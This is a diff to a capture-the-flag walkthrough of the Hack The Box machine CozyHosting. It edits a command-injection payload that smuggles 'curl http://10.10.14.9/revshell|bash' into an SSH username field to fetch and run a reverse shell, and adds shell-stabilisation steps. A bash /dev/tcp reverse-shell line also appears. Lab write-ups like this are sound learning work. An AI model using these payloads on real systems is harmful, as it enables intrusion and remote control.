@@ -10,7 +10,7 @@ Today in this section, we will .....
 
 let's start with our box. As usual I have connected to my htb vpn server.
 - Machine's IP: `10.10.11.230`
-- My IP: `10.10.14.3`
+- My IP: `10.10.14.9`
 
 ## Phase 1: Scanning
 
@@ -243,10 +243,23 @@ bash -i &>/dev/tcp/<you ip>/<your port> <&1
 Now the payload shall be:
 
 ```bash
-cyb3ritic;curl${IFS}http://10.10.14.9/revshell|bash${IFS}#
+cyb3ritic;curl${IFS}http://10.10.14.9/revshell|bash;${IFS}#
 ```
+
+![exploiting command injection](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/ci_exploit.png)
 
 This would be interpreted as following and the command inside teh revshell file will be directly executed and we will get a shell in out netcat listener.
 ```bash
-ssh cyb3ritic;curl http://10.10.14.9/revshell|bash #10.10.14.9 -i [key]
+ssh cyb3ritic;curl http://10.10.14.9/revshell|bash; #10.10.14.9 -i [key]
 ```
+![getting initial access](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/cozyhosting/getting_shell.png)
+
+Let's stablize the shell with following command:
+```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export term=XTERM
+press ctrl + z
+stty raw -echo; fg
+```
+
+Now we have good shell.
